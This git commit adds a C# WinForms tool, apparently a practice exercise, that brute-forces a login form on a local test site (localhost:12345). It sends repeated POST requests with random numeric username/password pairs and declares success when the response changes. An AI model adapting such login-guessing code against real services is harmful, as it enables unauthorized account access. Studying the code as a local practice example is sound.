3ea2c4b1e2c4c232d68ad188580ecea8c21644bb
1244952898 <1244952898@qq.com>
2017-07-17 10:43:19 +0800

    破解2

---
+++ 网络简单登录破解2/Form1.Designer.cs
@@ -0,0 +1,110 @@
+﻿namespace 网络简单登录破解2
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.webBrowser1 = new System.Windows.Forms.WebBrowser();
+            this.button1 = new System.Windows.Forms.Button();
+            this.panel2 = new System.Windows.Forms.Panel();
+            this.webBrowser2 = new System.Windows.Forms.WebBrowser();
+            this.panel1.SuspendLayout();
+            this.panel2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // panel1
+            // 
+            this.panel1.Controls.Add(this.webBrowser1);
+            this.panel1.Location = new System.Drawing.Point(1, 12);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(606, 647);
+            this.panel1.TabIndex = 0;
+            // 
+            // webBrowser1
+            // 
+            this.webBrowser1.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.webBrowser1.Location = new System.Drawing.Point(0, 0);
+            this.webBrowser1.MinimumSize = new System.Drawing.Size(20, 20);
+            this.webBrowser1.Name = "webBrowser1";
+            this.webBrowser1.Size = new System.Drawing.Size(606, 647);
+            this.webBrowser1.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(532, 692);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "暴力破解";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // panel2
+            // 
+            this.panel2.Controls.Add(this.webBrowser2);
+            this.panel2.Location = new System.Drawing.Point(739, 12);
+            this.panel2.Name = "panel2";
+            this.panel2.Size = new System.Drawing.Size(641, 703);
+            this.panel2.TabIndex = 2;
+            // 
+            // webBrowser2
+            // 
+            this.webBrowser2.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.webBrowser2.Location = new System.Drawing.Point(0, 0);
+            this.webBrowser2.MinimumSize = new System.Drawing.Size(20, 20);
+            this.webBrowser2.Name = "webBrowser2";
+            this.webBrowser2.Size = new System.Drawing.Size(641, 703);
+            this.webBrowser2.TabIndex = 0;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1417, 765);
+            this.Controls.Add(this.panel2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.panel1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.panel1.ResumeLayout(false);
+            this.panel2.ResumeLayout(false);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.WebBrowser webBrowser1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Panel panel2;
+        private System.Windows.Forms.WebBrowser webBrowser2;
+    }
+}
+
---
+++ 网络简单登录破解2/Form1.cs
@@ -0,0 +1,81 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace 网络简单登录破解2
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            string url = "http://localhost:12345/jd/Login/Login";
+              //创建http链接
+            var request = (HttpWebRequest)WebRequest.Create(url);
+            var response = (HttpWebResponse)request.GetResponse();
+            Stream stream = response.GetResponseStream();
+            StreamReader sr = new StreamReader(stream);
+            string content = sr.ReadToEnd();
+            webBrowser1.DocumentText = content;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            var url = "http://localhost:12345/jd/Login/Index";
+            string prev = string.Empty;
+            for (int i = 0; i < 1100; i++)
+            {
+                var username = new Random(DateTime.Now.Millisecond).Next(8, 19).ToString();
+                Thread.Sleep(2);
+                var password = new Random(DateTime.Now.Millisecond).Next(8, 19).ToString();
+                //post提交的内容
+                var content = "username=" + username + "&password=" + password;
+                var bytes = Encoding.UTF8.GetBytes(content);
+                var request = (HttpWebRequest)WebRequest.Create(url);
+                //根据fiddler中查看到的提交信息，我们也试着模拟追加此类信息然后提交
+                request.Method = WebRequestMethods.Http.Post;
+                request.Timeout = 1000 * 60;
+                request.AllowAutoRedirect = true;
+                request.ContentLength = bytes.Length;
+                request.ContentType = "application/x-www-form-urlencoded";
+
+                //将content写入post请求中
+                var stream = request.GetRequestStream();
+                stream.Write(bytes, 0, bytes.Length);
+                stream.Close();
+
+                //写入成功，获取请求流
+                var response = (HttpWebResponse)request.GetResponse();
+                var sr = new StreamReader(response.GetResponseStream());
+                var next = sr.ReadToEnd();
+                if (string.IsNullOrEmpty(prev))
+                {
+                    prev = next;
+                }
+                else
+                {
+                    if (prev != next&&!next.Contains(" <input type=\"text\" id=\"name\" />"))
+                    {
+                        webBrowser2.DocumentText = next;
+                        MessageBox.Show("恭喜你，密码已经破解！一共花费：" + (i + 1) + "次，用户名为：" + username + ",密码为：" + password);
+                        return;
+                    }
+                }
+                webBrowser2.DocumentText = "不好意思，未能破解"+DateTime.Now;
+            }
+        }
+    }
+}
